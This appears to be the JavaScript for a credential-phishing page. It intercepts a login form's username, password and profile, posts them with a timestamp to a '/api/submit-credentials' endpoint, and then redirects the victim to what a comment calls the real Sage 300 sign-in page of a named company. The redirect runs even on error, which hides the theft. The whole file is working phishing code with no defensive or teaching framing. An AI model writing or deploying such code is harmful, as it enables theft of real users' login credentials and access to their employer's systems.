import './main.css'

console.log('Script loaded');

document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.getElementById('loginForm');
  console.log('Form found:', loginForm);

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault(); // Prevent the form from actually submitting

    // Get form data
    const formData = {
      username: document.getElementById('username').value,
      password: document.getElementById('password').value,
      profile: document.getElementById('profile').value,
      timestamp: new Date().toISOString()
    };

    // Send data to server
    fetch('/api/submit-credentials', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(formData)
    })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        // Redirect to the real Sage 300 login page or show a error message
        window.location.href = 'https://cess.chem-labs.com/WebSelfService#/signin';
      })
      .catch((error) => {
        console.error('Error:', error);
        // Still redirect even if there's an error
        window.location.href = 'https://cess.chem-labs.com/WebSelfService#/signin';
      });

    // Clear the form
    loginForm.reset();
  });
});